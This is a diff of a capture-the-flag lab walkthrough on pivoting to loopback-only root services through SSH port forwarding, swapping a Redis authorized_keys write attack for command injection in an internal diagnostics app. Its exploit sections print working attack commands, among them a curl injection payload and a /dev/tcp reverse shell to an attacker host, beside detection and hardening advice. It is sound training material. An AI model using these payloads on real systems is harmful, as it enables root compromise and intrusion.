@@ -1,8 +1,8 @@
 # Chapter 07 — "Local Service + Port Forwarding" · Debrief
 
 > Full walkthrough for `hollow-relay-01` (`target-pivot`). Reach a loopback-only
-> root service through an SSH tunnel, then let it write a file as root. Try the
-> box with [README.md](README.md) first.
+> root service through an SSH tunnel, then exploit it for code execution as root.
+> Try the box with [README.md](README.md) first.
 
 **Flag:** `/root/flag.txt` → `R2R{a_l00pback_service_is_one_ssh_dash_L_away}`
 
@@ -16,16 +16,17 @@ run them as root, leave them unpatched. The moment you have *any* shell on the
 box, "only reachable from localhost" stops being a boundary: SSH port forwarding
 makes the target's loopback reachable from your attacker machine.
 
-Here the loopback service is **Redis**, no password, running as **root**. Redis
-can be told where to write its on-disk snapshot — so a root Redis is an
-arbitrary-file-write as root. Point it at `/root/.ssh/authorized_keys` or
-`/etc/cron.d`, and the box is yours.
+Here the loopback service is an internal **diagnostics web app**, running as
+**root**, whose `/ping` endpoint shells out with unsanitised input — a textbook
+**command injection**. Reach it through a tunnel and you have code execution as
+root. A second loopback service, a root "updater", gives the same result from
+the other forwarding direction.
 
 **Recon that finds it:**
 
 ```bash
 ss -tlnp                  # (or netstat -tlnp) — what listens, on which iface
-# tcp LISTEN 127.0.0.1:6379  -> Redis, loopback only
+# tcp LISTEN 127.0.0.1:8080  -> an internal web app, loopback only
 ```
 
 ---
@@ -34,9 +35,9 @@ ss -tlnp                  # (or netstat -tlnp) — what listens, on which iface
 
 ```bash
 # -L  LOCAL forward: bring the TARGET's loopback service to YOUR machine
-ssh -L 6379:127.0.0.1:6379 labuser1@target-pivot
-#    attacker:6379  ──tunnel──▶  target sees 127.0.0.1:6379
-redis-cli -h 127.0.0.1 -p 6379 ping        # PONG
+ssh -L 8080:127.0.0.1:8080 labuser1@target-pivot
+#    attacker:8080  ──tunnel──▶  target sees 127.0.0.1:8080
+curl http://127.0.0.1:8080/                # the internal diagnostics app
 
 # -R  REMOTE forward: push one of YOUR services onto the TARGET's loopback
 ssh -R 9000:127.0.0.1:8000 labuser1@target-pivot
@@ -46,55 +47,56 @@ ssh -R 9000:127.0.0.1:8000 labuser1@target-pivot
 
 # -D  DYNAMIC forward: a SOCKS proxy for a whole subnet behind the target
 ssh -D 1080 labuser1@target-pivot
-#    then: proxychains redis-cli ...   /   curl --socks5 127.0.0.1:1080 ...
+#    then: proxychains curl ...   /   curl --socks5 127.0.0.1:1080 ...
 ```
 
 Add `-f -N` to push the tunnel into the background with no remote shell
 (`-f` = fork after auth, `-N` = don't run a command). No SSH on the box? The
 same forwards work with **chisel** (`chisel server --reverse` on the attacker,
-`chisel client … R:6379:127.0.0.1:6379` on the target) or **socat**.
+`chisel client … R:8080:127.0.0.1:8080` on the target) or **socat**.
 
 ---
 
-## The write primitive — Redis as root
+## Station A — local forward (-L) → web RCE  ·  ★★★☆
 
+### 1. Recon
+With the `-L` tunnel up, look at the app:
+```bash
+curl http://127.0.0.1:8080/
+# Hollow Relay intranet diagnostics.  Try: /ping?host=127.0.0.1
+curl -G 'http://127.0.0.1:8080/ping' --data-urlencode 'host=127.0.0.1' | head -1
+# Running: ping -c1 -W1 127.0.0.1      <- it SHOWS you the shell command it builds
 ```
-redis-cli -h 127.0.0.1 -p 6379
-> config set dir <directory>       # where SAVE writes
-> config set dbfilename <file>     # the filename SAVE uses
-> set payload "<file contents>"    # a key's value becomes file content
-> save                             # dump to <directory>/<file>, as root
-```
+The page echoing the command it will run, with your value tacked on the end, is
+the classic sign your input is concatenated into a shell line.
 
-The on-disk RDB snapshot has binary header/footer bytes, so pad real payloads
-with blank lines (`\n\n…\n\n`); sshd and cron skip the unparseable lines and act
-on yours.
+### 2. The flaw
+`/ping?host=X` builds `"ping -c1 -W1 " + X` and runs it through `/bin/sh`. A `;`
+(or `|`, `$(…)`, `&&`) in `host` starts a **new** command — and the whole app
+runs as **root**.
 
----
-
-## Station A — authorized_keys → `ssh root@`  ·  ★★★☆
-
-### 1–3. Recon → flaw → exploit
-Redis is root and can write `/root/.ssh/` (which exists, mode `700`). Drop your
-public key there and log in as root.
-
+### 3. Exploit
 ```bash
 # attacker
-ssh -f -N -L 6379:127.0.0.1:6379 labuser1@target-pivot
-ssh-keygen -t ed25519 -f ./k -N ''
-printf '\n\n%s\n\n' "$(cat ./k.pub)" | redis-cli -h 127.0.0.1 -p 6379 -x set pwn
-redis-cli -h 127.0.0.1 -p 6379 config set dir /root/.ssh
-redis-cli -h 127.0.0.1 -p 6379 config set dbfilename authorized_keys
-redis-cli -h 127.0.0.1 -p 6379 save
-ssh -i ./k root@target-pivot 'id; cat /root/flag.txt'
+ssh -f -N -L 8080:127.0.0.1:8080 labuser1@target-pivot
+curl -G 'http://127.0.0.1:8080/ping' \
+  --data-urlencode 'host=127.0.0.1; id; cat /root/flag.txt'
+# ... uid=0(root) ...  R2R{...}
+```
+For an interactive shell, inject a reverse shell to a listener on your box:
+```bash
+curl -G 'http://127.0.0.1:8080/ping' \
+  --data-urlencode 'host=127.0.0.1; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'
 ```
 
 ### 4. Why it works
-`SAVE` writes `/root/.ssh/authorized_keys` as root. The file is `root:root 0644`
-— exactly what sshd wants — and contains a valid key line amid the RDB bytes.
-`PermitRootLogin prohibit-password` allows key-based root login, so your key is
-accepted. An SSH key is high-entropy, so it survives Redis's RDB encoding
-verbatim.
+`subprocess.run(cmd, shell=True)` hands the whole string to `/bin/sh -c`, which
+re-parses shell metacharacters — so `127.0.0.1; cat …` is two commands, not one
+argument to `ping`. The service never validated `host`, and it runs as root, so
+your second command runs as root. The **only** thing standing between you and
+this bug was the loopback binding — which `-L` removed. (`curl -G
+--data-urlencode` URL-encodes the `;` and spaces so they survive the query
+string.)
 
 ### 5. Detect / 6. Harden — see the shared sections below.
 
@@ -138,12 +140,11 @@ ssh labuser1@target-pivot cat /tmp/flag
 your script and runs it as root. `-R` binds the target's loopback by default
 (no `GatewayPorts` needed), which is exactly where the updater looks.
 
-> **Why not make Redis write the cron job directly?** You can try — `CONFIG SET
-> dir /etc/cron.d` — but modern Debian's cron **rejects an entire `/etc/cron.d`
-> file if any line fails to parse**, and the RDB snapshot's binary header is an
-> unparseable line. `authorized_keys` (Station A) works because sshd *skips* bad
-> lines; cron does not. That asymmetry is why Station B uses a remote forward
-> instead — and it's a real lesson in which sinks tolerate the RDB framing.
+> **Why `-R` here and not another `-L`?** Station A pulled a service *to* you.
+> But this bug is a service on the target reaching *out* to its own loopback —
+> you can't satisfy it by connecting in. `-R` is the tool for that shape:
+> publish your listener onto the target's loopback so its root job talks to you.
+> Recognising which direction a situation needs is the whole skill.
 
 ### 5/6. Detect & harden — shared below (plus: never pipe a network fetch to a
 shell, and authenticate even loopback services).
@@ -153,38 +154,39 @@ shell, and authenticate even loopback services).
 ## Detect (both stations)
 
 ```bash
-# a root Redis is the root cause:
-ps -o user,cmd -C redis-server            # USER should never be root
-ss -tlnp | grep 6379                      # bound where? who owns it?
-# the write artefacts:
-auditctl -w /root/.ssh/authorized_keys -p wa -k root_keys
+# services running as root that shouldn't be:
+ps -o user,cmd -ax | grep -E 'intranet|python3 .*8080'   # web app USER = root?
+ss -tlnp                                   # what's listening, on which iface, as whom
+# command injection: an app process with a sh/ping child it didn't mean to spawn,
+# or request parameters containing ; | ` $(  reaching a diagnostics endpoint
+# -R abuse: an sshd child holding a forwarded port; a root job piping curl | bash
 auditctl -w /etc/cron.d -p wa -k crond_drop
-# tunnels: an sshd child with a forwarded port, unexpected listeners on the box
 ```
 
 ## Harden (both stations)
 
-- **Don't run Redis as root.** The packaged unit runs it as the `redis` user —
-  the lab breaks that on purpose. As `redis`, it can't write `/root` or
-  `/etc/cron.d`.
-- **Require auth** (`requirepass` / ACLs) and keep `protected-mode on`.
-- **Redis 7+ already helps:** `dir`/`dbfilename` are *protected configs* and
-  `CONFIG SET` can't change them at runtime unless `enable-protected-configs
-  yes` is set — the lab opts in so you can practise the classic technique. Leave
-  it off in production.
+- **Don't run internal services as root.** The diagnostics app runs as root on
+  purpose; as an unprivileged service account, RCE would land you as that user,
+  not root.
+- **Don't build shell commands from user input.** Pass an argv array
+  (`subprocess.run(["ping","-c1",host])`, no `shell=True`) so there's no shell to
+  re-parse, and validate `host` to a strict hostname/IP pattern.
+- **Never `curl … | bash`** (Station B): don't fetch-and-execute, and
+  authenticate even loopback endpoints.
 - **Loopback binding is not a control.** Firewall and authenticate internal
   services as if they were exposed; assume any shell on the host can reach them.
 - **Lock down forwarding** where it isn't needed: `AllowTcpForwarding no`,
-  `PermitRootLogin no`, per-user `permitopen`.
+  per-user `permitopen`, `GatewayPorts no`.
 
 ## Real world
-Password-less Redis as root behind a "loopback-only" binding is a perennial
-finding — it powered mass internet compromises (exposed 6379) and is a staple of
-internal pivots when the service is only on `127.0.0.1`. The SSH-key and cron
-write primitives are the canonical two; the same shape applies to other
-loopback services (memcached, unauth Jenkins, an internal admin API, a debug
-port). The transferable skill is the pivot: *enumerate listeners, forward the
-port, attack the service.*
+Internal services bound to `127.0.0.1` — admin panels, debug consoles,
+diagnostics tools, metrics endpoints, unauth Jenkins/Redis/Elasticsearch — are
+routinely unauthenticated and over-privileged because "nobody can reach them."
+Anyone with a shell can, via an SSH forward. Command injection in a
+network-tools feature is one of the most common web bugs (see
+[[C09-Station-C-Command-Injection]]); here it's the same bug on an internal
+service a tunnel away. The transferable skill is the pivot: *enumerate
+listeners, forward the port, attack the service.*
 
 ---
 
@@ -200,13 +202,12 @@ docker compose up -d --build --force-recreate target-pivot
 
 - **`ss -tlnp` is part of privesc recon.** The win may be a service, not a file.
 - **Loopback ≠ safe.** `ssh -L` (or `-R`, `-D`, chisel) dissolves the boundary.
-- **A root service that writes files is a root file-write.** Redis → ssh key or
-  cron is the classic; the pattern generalises.
+- **A root service with a bug is root RCE.** Reaching it is the pivot; the bug
+  (here, command injection) is the same class you'd exploit on any web target.
 - **Know the three forwards:** `-L` pull a remote service to you, `-R` push your
-  service to them, `-D` SOCKS a whole network.
-- **Modern mitigations exist** (non-root service user, `enable-protected-configs`,
-  RDB compression) — recognising why each one would have stopped you *is* the
-  defensive lesson.
+  service to them, `-D` SOCKS a whole network — and which shape each situation needs.
+- **The fixes are ordinary:** don't run services as root, don't build shell
+  commands from input, don't `curl | bash`, and don't treat loopback as auth.
 
 Recipes are collected in the
 [Blue-Team Playbook](https://github.com/Adw0rm-sec/road-to-root/wiki/Blue-Team-Playbook).
